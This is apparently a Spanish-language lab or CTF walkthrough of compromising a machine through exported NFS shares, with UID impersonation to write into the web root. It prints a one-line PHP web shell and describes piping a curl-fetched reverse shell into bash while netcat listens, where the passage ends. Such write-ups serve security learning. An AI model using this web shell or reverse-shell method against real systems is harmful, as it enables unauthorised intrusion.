Haremos los reconocimientos de nmap como siempre:
![[Pasted image 20230218103500.png]]
Vemos que tiene el puerto 80, por lo que hacemos un whatweb para conocer cómo funciona dicha web:
![[Pasted image 20230218103557.png]]
![[Pasted image 20230218104130.png]]
De todos modos en el escaneo de nmap vemos que tiene abierto el puerto 2049; y este puerto es importante auditarlo porque puede contener muchas vulnerabilidades:
![[Pasted image 20230218104114.png]]
Por tanto podemos acudir a la web de hacktricks para ver cómo se hackea a través de este puerto; y ponerlo en el buscador:
![[Pasted image 20230218104422.png]]
Y aquí nos explica como explotar vulnerabilidades del servicio NFS en el puerto 2049:
![[Pasted image 20230218104513.png]]
Y ahora en esta parte nos explican como consultar los recursos compartidos del lado de la máquina víctima que nos permita a nosotros montar en nuestro equipo atacante; y eso lo comprobamos con este comando showmount -e:
![[Pasted image 20230218104654.png]]
Lo probamos y nos encuentra dos recursos compartidos que nos lo podemos montar en nuestra máquina:
![[Pasted image 20230218104739.png]]
Por tanto con el comando mount vamos a montarnos estas dos carpetas y trasladarlas a nuestro equipo, donde por ejemplo en este caso nos traemos el recurso compartido /home/ross a un directorio de nuestra máquina llamado ross:
![[Pasted image 20230218105326.png]]
Y lo mismo con el otro recurso compartido:
![[Pasted image 20230218105413.png]]
Y ahora tenemos clonado estos dos directorios de la máquina víctima en nuestra máquina. Por ejemplo vamos a ver el contenido de la carpeta ross:
![[Pasted image 20230218105546.png]]
Y aquí dentro de la carpeta Documents nos encontramos con un fichero de keepas con extensión .kdbx:
![[Pasted image 20230218105639.png]]
Pero si inspeccionamos el fichero html, vemos que no tenemos permisos para entrar, ya que la carpeta es del usuario 2017:
![[Pasted image 20230218110920.png]]
![[Pasted image 20230218110934.png]]
Por tanto tenemos que cambiar el propietario de este directorio para poder entrar; y para eso vamos a crear un nuevo usuari con cualquier nombre; y después con el comando usermod podemos cambiar los atributos y decimos que el usuario 2017 ahora será el usuario que hemos creado antes, el usuario pepino; y ya tendremos permisos sobre el directorio html si somos el usuario pepino:
![[Pasted image 20230218111433.png]]
Nos logueamos como el usuario que acabamos de crear:
![[Pasted image 20230218111532.png]]
Tenemos que ejecutar una bash para poder ejecutar comandos:
![[Pasted image 20230218111611.png]]
Y dentro nos encontramos con este directorio:
![[Pasted image 20230218111733.png]]
Que si hacemos una prueba, vemos que está sincronizado con la web, ya que si creamos un fichero .txt, vemos que desde la web podemos acceder a él:
![[Pasted image 20230218111930.png]]
![[Pasted image 20230218111939.png]]
Vemos que el directorio que está montado se encuentra vinculado con el mismo directorio de la máquina víctima, por lo que en este punto podemos cargar un fichero php malicioso para conseguir ejecución remota de comandos:[[0 - Consideraciones Previas#Código PHP malicioso para ganar Reverse Shell]]
```python
<?php
        echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
?>
```
Y ahora accedemos desde la web a este fichero php malicioso y obtenemos ejecución remota de comandos:
![[Pasted image 20230218112301.png]]
Ahora que tenemos ejecución remota de comandos, nos montamos un servidor web con Python que aloje el código que nos enviará una reverse shell:
![[Pasted image 20230218113140.png]]
Lo montamos:
![[Pasted image 20230218113157.png]]
Y ahora desde la máquina víctima hacemos un curl de este servidor web y lo pipeamos con bash; mientras nos ponemos en escucha con netcat:


